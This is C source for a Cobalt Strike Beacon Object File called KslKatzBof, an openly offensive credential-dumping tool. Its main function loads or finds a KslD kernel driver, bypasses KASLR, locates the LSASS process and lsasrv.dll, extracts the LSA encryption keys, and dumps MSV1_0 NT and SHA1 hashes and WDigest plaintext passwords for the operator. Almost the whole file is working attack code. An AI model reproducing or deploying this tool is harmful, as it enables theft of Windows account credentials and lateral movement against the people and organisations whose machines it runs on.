/*
 * KslKatzBof - KslD driver-based LSASS credential extraction BOF
 */


#include "common.h"
#include "beacon.h"

#include "driver.c"
#include "memory.c"
#include "crypto.c"
#include "lsa.c"

void go(char *args, int argLen) {
    (void)args; (void)argLen;
    // ----------------------------------------------------------------
    // Allocate output buffer
    // ----------------------------------------------------------------
    output = (char*)intAlloc(bufsize);
    currentoutsize = 0;
    internal_printf("[*] KslKatzBof - KslD LSASS credential extractor\n");
    // ----------------------------------------------------------------
    // Windows build number
    // ----------------------------------------------------------------
    DWORD dwMajor = 0, dwMinor = 0, dwBuild = 0;
    RtlGetNtVersionNumbers(&dwMajor, &dwMinor, &dwBuild);
    uint32_t build = dwBuild & 0x7FFF;
    internal_printf("[*] Windows %lu.%lu build %u\n",
                 (unsigned long)dwMajor, (unsigned long)dwMinor, build);

  

    // ----------------------------------------------------------------
    // Deploy / find KslD driver
    // ----------------------------------------------------------------
    internal_printf("[*] Setting up KslD driver...\n");
    DriverState* state = (DriverState*)MSVCRT$malloc(sizeof(DriverState));
    if (!state) {
        BeaconPrintf(CALLBACK_ERROR, "[-] malloc failed\n");
        printoutput(TRUE);
        return;
    }
    MSVCRT$memset(state, 0, sizeof(DriverState));
    if (!setup_ksld(state)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Driver setup failed\n");
        MSVCRT$free(state);
        printoutput(TRUE);
        return;
    }
    internal_printf("[+] Driver ready, handle=0x%p\n", state->handle);

    // ----------------------------------------------------------------
    // KASLR bypass (ntoskrnl base via IDT + ISR scan)
    // ----------------------------------------------------------------
    internal_printf("[*] KASLR bypass...\n");
    SubCmd2Info kaslr_info;
    if (!kaslr_bypass(state->handle, &kaslr_info)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] KASLR bypass failed\n");
        cleanup_ksld(state);
        MSVCRT$free(state);
        printoutput(TRUE);
        return;
    }
    internal_printf("[+] ntoskrnl base=0x%llx  CR3=0x%llx\n",
                 kaslr_info.ntos_base, kaslr_info.cr3);

    // ----------------------------------------------------------------
    // Find LSASS (lsass.exe) EPROCESS
    // ----------------------------------------------------------------
    internal_printf("[*] Finding LSASS process...\n");
    LSASSInfo LSASS;
    if (!find_LSASS(state->handle, &LSASS)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find LSASS\n");
        cleanup_ksld(state);
        MSVCRT$free(state);
        printoutput(TRUE);
        return;
    }
    internal_printf("[+] LSASS EPROCESS=0x%llx DTB=0x%llx PEB_off=0x%x\n",
                 LSASS.eprocess, LSASS.dtb, LSASS.peb_offset);

    // ----------------------------------------------------------------
    // Find lsasrv.dll (lsasrv.dll) module in LSASS
    // ----------------------------------------------------------------
    internal_printf("[*] Finding lsasrv.dll in LSASS...\n");
    ModuleInfo sassvc_mod;
    if (!find_module(state->handle, LSASS.dtb, LSASS.eprocess, LSASS.peb_offset,
                     L"lsasrv.dll", &sassvc_mod)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] lsasrv.dll not found in LSASS module list\n");
        cleanup_ksld(state);
        MSVCRT$free(state);
        printoutput(TRUE);
        return;
    }
    internal_printf("[+] lsasrv.dll at 0x%llx, size 0x%x\n",
                 sassvc_mod.base, sassvc_mod.size);

    // ----------------------------------------------------------------
    // Extract LSA encryption keys (IV + AES + DES)
    // ----------------------------------------------------------------
    internal_printf("[*] Extracting LSA keys...\n");
    LsaKeys keys;
    if (!extract_lsa_keys(state->handle, LSASS.dtb, sassvc_mod.base, sassvc_mod.size, &keys)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LSA key extraction failed\n");
        cleanup_ksld(state);
        MSVCRT$free(state);
        printoutput(TRUE);
        return;
    }
    internal_printf("[+] LSA keys: IV=%u AES=%u DES=%u bytes\n",
                 (unsigned)keys.iv.size,
                 (unsigned)keys.aes_key.size,
                 (unsigned)keys.des_key.size);

    // ----------------------------------------------------------------
    // Logon passwords
    // ----------------------------------------------------------------
    internal_printf("[*] Finding LogonSessionList...\n");
    LogonListInfo logon_list;
    if (!find_logon_list(state->handle, LSASS.dtb,
                         sassvc_mod.base, sassvc_mod.size,
                         build, &logon_list)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LogonSessionList not found\n");
        LsaKeys_free(&keys);
        cleanup_ksld(state);
        MSVCRT$free(state);
        printoutput(TRUE);
        return;
    }
    internal_printf("[+] LogonSessionList at 0x%llx, %u entries\n",
                 logon_list.list_ptr, logon_list.count);

    InformationList creds;
    InformationList_init(&creds);
    internal_printf("[*] Extracting credentials...\n");
    extract_creds(state->handle, LSASS.dtb,
                  logon_list.list_ptr, logon_list.count,
                  build, &keys, &creds);

    if (creds.count == 0) {
        internal_printf("[*] No MSV1_0 credentials found\n");
    } else {
        internal_printf("[+] Got %u credential(s)\n", (unsigned)creds.count);
        size_t i;
        for (i = 0; i < creds.count; i++) {
            information* c = &creds.items[i];
            char userbuf[MAX_STR_LEN]   = {0};
            char domainbuf[MAX_STR_LEN] = {0};
            WideCharToMultiByte(CP_UTF8, 0, c->user,   -1, userbuf,   sizeof(userbuf),   NULL, NULL);
            WideCharToMultiByte(CP_UTF8, 0, c->domain, -1, domainbuf, sizeof(domainbuf), NULL, NULL);
            internal_printf(
                "  [MSV] %s\\%s\n"
                "    NT:   %s\n"
                "    SHA1: %s\n",
                domainbuf, userbuf,
                c->nt_hash,
                c->sha_hash);
        }
    }
    InformationList_free(&creds);

    // ----------------------------------------------------------------
    // WDigest
    // ----------------------------------------------------------------
    WDigestList wdig;
    WDigestList_init(&wdig);
    internal_printf("[*] Extracting WDigest credentials...\n");
    extract_wdigest_creds(state->handle, LSASS.dtb,
                          LSASS.eprocess, LSASS.peb_offset,
                          &keys, &wdig);

    if (wdig.count == 0) {
        internal_printf("[*] No WDigest credentials found\n");
    } else {
        internal_printf("[+] Got %u WDigest credential(s)\n", (unsigned)wdig.count);
        size_t i;
        for (i = 0; i < wdig.count; i++) {
            WDigestinformation* w = &wdig.items[i];
            char userbuf[MAX_STR_LEN]    = {0};
            char domainbuf[MAX_STR_LEN]  = {0};
            char passbuf[MAX_STR_LEN]    = {0};
            WideCharToMultiByte(CP_UTF8, 0, w->user,     -1, userbuf,   sizeof(userbuf),   NULL, NULL);
            WideCharToMultiByte(CP_UTF8, 0, w->domain,   -1, domainbuf, sizeof(domainbuf), NULL, NULL);
            WideCharToMultiByte(CP_UTF8, 0, w->password, -1, passbuf,   sizeof(passbuf),   NULL, NULL);
            internal_printf(
                "  [WDigest] %s\\%s : %s\n",
                domainbuf, userbuf, passbuf);
        }
    }
    WDigestList_free(&wdig);

    // ----------------------------------------------------------------
    // Cleanup
    // ----------------------------------------------------------------
    LsaKeys_free(&keys);
    cleanup_ksld(state);
    MSVCRT$free(state);

    internal_printf("[+] Done.\n");
    printoutput(TRUE);
}
